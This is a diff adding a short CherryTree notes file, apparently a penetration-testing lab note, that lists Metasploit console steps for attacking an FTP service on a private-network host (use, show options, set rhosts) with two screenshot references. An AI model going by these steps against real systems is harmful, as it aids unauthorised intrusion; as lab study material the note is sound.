@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="20" master_id="0" name="exploit using msf" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1753532145" ts_lastsave="1753532406">
+    <rich_text>exploiting the ftp port using msfconsole
+msf&gt;use 0
+msf&gt;show options
+msf&gt;set rhosts 192.168.100.4
+
+      
+
+</rich_text>
+    <encoded_png char_offset="98" justification="left" link="" sha256sum="718062e7b315d05cedf01d7fbfc2a4418c971a8c43b0e9e3432e9a1677f26af2"/>
+    <encoded_png char_offset="102" justification="left" link="" sha256sum="675b0c40dd55b334e7b368ef47c42bb4d68632b96c1079ac106cc3149af02e39"/>
+  </node>
+</cherrytree>
